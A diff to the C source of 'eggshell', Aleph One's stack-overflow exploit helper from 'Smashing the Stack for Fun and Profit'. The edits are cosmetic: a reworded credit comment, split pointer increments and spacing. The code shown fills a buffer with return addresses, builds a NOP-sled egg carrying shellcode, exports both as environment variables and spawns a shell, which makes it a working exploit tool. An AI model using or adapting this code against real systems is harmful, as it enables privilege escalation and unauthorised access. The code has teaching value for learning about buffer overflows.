@@ -1,8 +1,8 @@
-/*
-* eggshell v1.0
-*
-* Aleph One / aleph1@underground.org
+/* Code from Appendix B of Smashing the Stack for Fun and Profit
+Credit goes to Aleph One
 */
+
+
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -57,23 +57,29 @@ void main(int argc, char *argv[]) {
 	printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
 	addr_ptr = (long *) bof;
 	for (i = 0; i < bsize; i+=4) {
-		*(addr_ptr++) = addr;
+		*(addr_ptr) = addr;
+		addr_ptr += 1;
 	}
+
 	ptr = egg;
 	for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE) {
 		for (n = 0; n < NOP_SIZE; n++) {
-		m = (n + align) % NOP_SIZE;
-		*(ptr++) = nop[m];
+			m = (n + align) % NOP_SIZE;
+			*(ptr) = nop[m];
+			ptr += 1;
 		}
 	}
+
 	for (i = 0; i < strlen(shellcode); i++) {
-		*(ptr++) = shellcode[i];
+		*(ptr) = shellcode[i];
+		ptr += 1;
 	}
+
 	bof[bsize - 1] = '\0';
 	egg[eggsize - 1] = '\0';
-	memcpy(egg,"EGG=",4);
+	memcpy(egg,"EGG=", 4);
 	putenv(egg);
-	memcpy(bof,"BOF=",4);
+	memcpy(bof,"BOF=", 4);
 	putenv(bof);
 	system("/bin/sh");
 }
